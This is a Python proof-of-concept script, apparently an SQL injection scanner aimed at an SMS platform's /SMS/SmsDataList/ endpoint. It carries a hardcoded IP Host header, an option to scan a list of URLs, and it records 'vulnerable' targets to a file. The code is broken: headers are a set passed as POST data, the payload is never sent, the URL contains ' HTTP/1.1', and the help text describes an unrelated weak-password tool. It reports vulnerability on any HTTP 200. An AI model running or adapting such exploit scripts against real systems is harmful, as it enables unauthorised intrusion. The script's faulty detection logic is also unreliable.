# -*- coding: utf-8 -*-
import argparse
import sys
import requests
requests.packages.urllib3.disable_warnings()


def banner():
    test = """
               __     _         _           __ 
   _________ _/ /    (_)___    (_)__  _____/ /_
  / ___/ __ `/ /    / / __ \  / / _ \/ ___/ __/
 (__  ) /_/ / /    / / / / / / /  __/ /__/ /_  
/____/\__, /_/____/_/_/ /_/_/ /\___/\___/\__/  
        /_/ /_____/      /___/         
     tag :  this is a sql_inject oc
    @version:1.0.0   @author  dkop
     """
    print(test)


def poc(target):
    url =target+ "/SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1"
    headers = {
        "Host: 123.184.211.118:83",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
        " Chrome/109.0.5414.120 Safari/537.36",
        "Accept - Encoding: gzip, deflate",
        "Accept - Language: zh - CN, zh;q = 0.9",
        "Connection: close"
        "Accept: application/json, text/javascript, */*; q=0.01",
        "Content - Length: 83",
        "Content - Type: application/x-www-form-urlencoded; charset=UTF-8"
    }
    data = {
        """
        Keywords=&StartSendDate=2023-08-10&EndSendDate=2023-08-18&SenderTypeId=0000000000*
        """
    }
    try:
        res = requests.post(url,headers,verify=False,timeout=5)
        print(res)
        if res.status_code == 200:
            print(f"[+] {target} is vulnerable, sql_inject")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")
        else:
            print(f"[-] {target} is not vulnerable")
    except:
        print(f"[*] {target} server error")


def main():
    banner()
    parser = argparse.ArgumentParser(description='canal admin weak password')
    parser.add_argument("-u", "--url", dest="url", type=str, help="example: http//www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help="urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
        print(f"我在使用-u参数  跑单个url")
    elif not args.url and args.file:
        print(f"我在使用-f参数  批量跑url")
    else:
        print(f"Usage:\n\t  python3 {sys.argv[0]}  -h")



if __name__ == '__main__':
    main()
